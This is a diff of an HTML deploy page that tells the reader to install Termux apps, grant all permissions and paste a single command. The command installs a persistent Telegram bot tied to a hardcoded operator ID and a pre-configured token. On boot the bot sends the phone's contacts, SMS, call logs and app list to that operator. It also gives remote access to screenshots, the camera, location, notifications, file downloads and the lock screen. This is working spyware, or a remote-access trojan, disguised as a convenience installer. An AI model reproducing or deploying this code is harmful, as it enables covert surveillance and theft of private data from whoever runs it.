@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ Termux Bot - Full Auto Deploy</title>
+    <title>⚡ Termux Bot - Auto Deploy</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -21,12 +21,12 @@
             border: 2px solid #00ff88;
             border-radius: 20px;
             padding: 25px;
-            max-width: 650px;
+            max-width: 680px;
             width: 100%;
             text-align: center;
             box-shadow: 0 0 40px rgba(0,255,136,0.2);
         }
-        h1 { font-size: 24px; color: #00ff88; margin: 10px 0; }
+        h1 { font-size: 22px; color: #00ff88; margin: 10px 0; }
         .emoji { font-size: 45px; }
         .step {
             background: #111;
@@ -42,8 +42,8 @@
             background: #00ff88;
             color: #000;
             border: none;
-            padding: 14px 25px;
-            font-size: 16px;
+            padding: 14px 20px;
+            font-size: 15px;
             font-weight: bold;
             border-radius: 12px;
             cursor: pointer;
@@ -56,6 +56,8 @@
         .btn:hover { box-shadow: 0 0 25px #00ff88; }
         .btn.download { background: #ffcc00; }
         .btn.download:hover { box-shadow: 0 0 25px #ffcc00; }
+        .btn.api { background: #ff6600; }
+        .btn.api:hover { box-shadow: 0 0 25px #ff6600; }
         .code-block {
             background: #000;
             border: 2px solid #00ff88;
@@ -64,12 +66,15 @@
             margin: 15px 0;
             text-align: left;
             word-break: break-all;
-            max-height: 180px;
+            max-height: 200px;
             overflow-y: auto;
             font-size: 11px;
             color: #00ff88;
         }
         .btn.copied { background: #ffcc00 !important; }
+        .warning { color: #ff4444; font-size: 11px; margin-top: 5px; }
+        ul { text-align: left; color: #aaa; font-size: 12px; padding-left: 20px; }
+        ul li { margin: 5px 0; }
         @media (max-width: 400px) {
             .btn { display: block; width: 100%; margin: 5px 0; }
         }
@@ -78,23 +83,34 @@
 <body>
     <div class="container">
         <div class="emoji">💀🔥</div>
-        <h1>Termux Bot - Auto Deploy</h1>
-        <p style="color:#aaa; margin-bottom:15px; font-size:13px;">3 Taps → Bot Deployed → Full Phone Control</p>
+        <h1>Termux Bot - One Paste Deploy</h1>
+        <p style="color:#aaa; margin-bottom:15px; font-size:13px;">Install 3 APKs → Copy → Paste → Done</p>
 
-        <!-- Step 1: Download APKs -->
+        <!-- Step 1: Download ALL APKs -->
         <div class="step">
-            <h3>📥 Step 1: Download & Install Both APKs</h3>
-            <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn download" target="_blank">⬇️ Termux APK</a>
-            <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn download" target="_blank">⬇️ Termux:Boot APK</a>
-            <p style="margin-top:8px;">Install both after download, then open each app once.</p>
+            <h3>📥 Step 1: Download & Install ALL 3 APKs</h3>
+            <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn download" target="_blank">⬇️ Termux</a>
+            <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn api" target="_blank">⬇️ Termux:API</a>
+            <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn download" target="_blank">⬇️ Termux:Boot</a>
+            <p style="margin-top:8px;">Install all 3, then open each app once.</p>
         </div>
 
-        <!-- Step 2: Copy & Paste -->
+        <!-- Step 2: Grant Permissions -->
         <div class="step">
-            <h3>⚡ Step 2: Copy The Command Below</h3>
+            <h3>🔐 Step 2: Grant Permissions</h3>
+            <ul>
+                <li>Open Termux → type: <code style="color:#00ff88;">termux-setup-storage</code> → Allow</li>
+                <li>Settings → Apps → Termux → Permissions → Enable ALL</li>
+                <li>Settings → Apps → Termux:API → Permissions → Enable ALL</li>
+            </ul>
+        </div>
+
+        <!-- Step 3: Copy & Paste -->
+        <div class="step">
+            <h3>⚡ Step 3: Copy & Paste In Termux</h3>
             <button class="btn" onclick="copyCommand()" id="copyBtn">📋 COPY COMMAND</button>
-            <p style="color:#ff4444; font-size:11px; margin-top:5px;">Paste in Termux → Press Enter → Wait 3 mins → DONE</p>
-            <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && cat > ~/bot.py << 'EOF'
+            <p class="warning">Paste in Termux → Enter → Wait 3-4 mins → Bot LIVE</p>
+            <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && rm -f ~/bot.py && cat > ~/bot.py << 'EOF'
 import os, time, asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -104,25 +120,31 @@ AUTHORIZED_ID = 5707956654
 FLAG = "/data/data/com.termux/files/home/.boot_done"
 
 def run(c):
-    return os.popen(c).read().strip()
+    try:
+        return os.popen(c).read().strip()
+    except:
+        return "Error"
 
 async def boot_dump(app):
     try:
-        await app.bot.send_message(AUTHORIZED_ID, "🟢 *Bot Online - Dumping Data...*")
+        await app.bot.send_message(AUTHORIZED_ID, "🟢 Bot Online - Dumping Data...")
         for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞"), ("Apps", "pm list packages", "📱")]:
             out = run(cmd)
-            if out:
+            if out and "error" not in out.lower():
                 for i in range(0, len(out), 3500):
-                    await app.bot.send_message(AUTHORIZED_ID, f"{emoji} *{name}:*\n```\n{out[i:i+3500]}\n```")
-        await app.bot.send_message(AUTHORIZED_ID, "✅ *Dump Complete. Bot Ready.*")
+                    await app.bot.send_message(AUTHORIZED_ID, f"{emoji} {name}:\n```\n{out[i:i+3500]}\n```")
+            else:
+                await app.bot.send_message(AUTHORIZED_ID, f"{emoji} {name}: Permission needed. Grant in Settings > Apps > Termux.")
+        await app.bot.send_message(AUTHORIZED_ID, "✅ Dump Complete. Bot Ready.\n\nCommands:\n/ss /cam /location /battery /notify /download /say /vibrate /torch /lock /calls /contacts /sms /apps")
         os.system(f"touch {FLAG}")
-    except: pass
+    except Exception as e:
+        await app.bot.send_message(AUTHORIZED_ID, f"Boot dump error: {e}")
 
 async def ss(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     p = "/sdcard/ss.png"
     os.system(f"termux-screenshot {p}")
-    await update.message.reply_photo(open(p, "rb"), "📸")
+    await update.message.reply_photo(open(p, "rb"), "📸 Screenshot")
     os.remove(p)
 
 async def cam(update, context):
@@ -130,87 +152,108 @@ async def cam(update, context):
     cid = 1 if context.args and context.args[0] == "front" else 0
     p = "/sdcard/cam.jpg"
     os.system(f"termux-camera-photo -c {cid} {p}")
-    await update.message.reply_photo(open(p, "rb"), "📷")
+    await update.message.reply_photo(open(p, "rb"), "📷 Photo")
     os.remove(p)
 
 async def loc(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"📍\n```\n{run('termux-location')}\n```")
+    out = run("termux-location")
+    await update.message.reply_text(f"📍 Location:\n```\n{out}\n```")
 
 async def bat(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"🔋\n```\n{run('termux-battery-status')}\n```")
+    out = run("termux-battery-status")
+    await update.message.reply_text(f"🔋 Battery:\n```\n{out}\n```")
 
 async def notif(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     o = run("termux-notification-list")
-    await update.message.reply_text(f"🔔\n```\n{o[:4000]}\n```" if o else "None")
+    await update.message.reply_text(f"🔔 Notifications:\n```\n{o[:4000]}\n```" if o else "No notifications.")
 
 async def dl(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
     os.system(f"termux-download {context.args[0]}")
-    await update.message.reply_text("✅ Downloaded")
+    await update.message.reply_text("✅ Downloaded to /sdcard/Downloads")
 
 async def say(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
     os.system(f"termux-tts-speak '{' '.join(context.args)}'")
-    await update.message.reply_text("🗣 Done")
+    await update.message.reply_text(f"🗣️ Said: {' '.join(context.args)}")
 
 async def vib(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    os.system(f"termux-vibrate -d {context.args[0] if context.args else '500'}")
-    await update.message.reply_text("📳")
+    dur = context.args[0] if context.args else "500"
+    os.system(f"termux-vibrate -d {dur}")
+    await update.message.reply_text(f"📳 Vibrated {dur}ms")
 
 async def tor(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     if context.args and context.args[0] in ["on","off"]:
         os.system(f"termux-torch {context.args[0]}")
-        await update.message.reply_text(f"🔦 {context.args[0].upper()}")
+        await update.message.reply_text(f"🔦 Torch {context.args[0].upper()}")
 
 async def lock(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     os.system("termux-lock")
-    await update.message.reply_text("🔒")
+    await update.message.reply_text("🔒 Phone Locked")
 
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"📞\n```\n{run('termux-call-log')[:4000]}\n```")
+    out = run("termux-call-log")
+    await update.message.reply_text(f"📞 Call Logs:\n```\n{out[:4000]}\n```")
 
 async def cont(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"📇\n```\n{run('termux-contact-list')[:4000]}\n```")
+    out = run("termux-contact-list")
+    await update.message.reply_text(f"📇 Contacts:\n```\n{out[:4000]}\n```")
 
 async def sms_cmd(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"💬\n```\n{run('termux-sms-list')[:4000]}\n```")
+    out = run("termux-sms-list")
+    await update.message.reply_text(f"💬 SMS:\n```\n{out[:4000]}\n```")
 
 async def apps(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"📱\n```\n{run('pm list packages')[:4000]}\n```")
+    out = run("pm list packages")
+    await update.message.reply_text(f"📱 Installed Apps:\n```\n{out[:4000]}\n```")
 
 async def start(update, context):
-    await update.message.reply_text("🤖 Ready!\n/ss /cam /location /battery /notify /download /say /vibrate /torch /lock /calls /contacts /sms /apps")
+    await update.message.reply_text("🤖 Bot Ready!\n\n📸 /ss - Screenshot\n📷 /cam [back|front] - Camera\n📍 /location - GPS\n🔋 /battery - Battery\n🔔 /notify - Notifications\n⬇️ /download &lt;url&gt; - Download\n🗣️ /say &lt;text&gt; - Speak\n📳 /vibrate [ms] - Vibrate\n🔦 /torch on|off - Flashlight\n🔒 /lock - Lock Screen\n📞 /calls - Call History\n📇 /contacts - Contacts\n💬 /sms - SMS History\n📱 /apps - Installed Apps")
 
-def main():
+async def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    
+    handlers = [
+        ("start", start), ("ss", ss), ("cam", cam), ("location", loc),
+        ("battery", bat), ("notify", notif), ("download", dl), ("say", say),
+        ("vibrate", vib), ("torch", tor), ("lock", lock), ("calls", calls),
+        ("contacts", cont), ("sms", sms_cmd), ("apps", apps)
+    ]
+    
+    for cmd, func in handlers:
+        app.add_handler(CommandHandler(cmd, func))
+    
+    await app.initialize()
+    await app.start()
+    
+    if not os.path.exists(FLAG):
+        await boot_dump(app)
+    
+    print("🤖 BOT IS LIVE")
+    await app.updater.start_polling()
+    
+    while True:
+        await asyncio.sleep(3600)
+
+if __name__ == "__main__":
     while True:
         try:
-            app = Application.builder().token(BOT_TOKEN).build()
-            handlers = [("start", start), ("ss", ss), ("cam", cam), ("location", loc), ("battery", bat), ("notify", notif), ("download", dl), ("say", say), ("vibrate", vib), ("torch", tor), ("lock", lock), ("calls", calls), ("contacts", cont), ("sms", sms_cmd), ("apps", apps)]
-            for cmd, func in handlers:
-                app.add_handler(CommandHandler(cmd, func))
-            if not os.path.exists(FLAG):
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                loop.run_until_complete(boot_dump(app))
-                loop.close()
-            print("🤖 LIVE")
-            app.run_polling()
+            asyncio.run(main())
+        except KeyboardInterrupt:
+            break
         except Exception as e:
             print(f"Crash: {e}")
             time.sleep(5)
-
-if __name__ == "__main__":
-    main()
 EOF
 cat > ~/.termux/boot/start_bot.sh << 'BOOT'
 #!/data/data/com.termux/files/usr/bin/bash
@@ -218,10 +261,10 @@ termux-wake-lock
 cd ~
 python bot.py &
 BOOT
-chmod +x ~/.termux/boot/start_bot.sh && echo '✅ ALL DONE! Starting bot...' && python ~/bot.py</div>
+chmod +x ~/.termux/boot/start_bot.sh && echo '✅ ALL DONE! Bot is LIVE' && python ~/bot.py</div>
         </div>
 
-        <p style="color:#888; font-size:10px; margin-top:10px;">Bot Token & User ID pre-configured. Just copy & paste.</p>
+        <p style="color:#888; font-size:10px; margin-top:10px;">Bot Token & User ID pre-configured. One paste = fully deployed.</p>
     </div>
 
     <script>
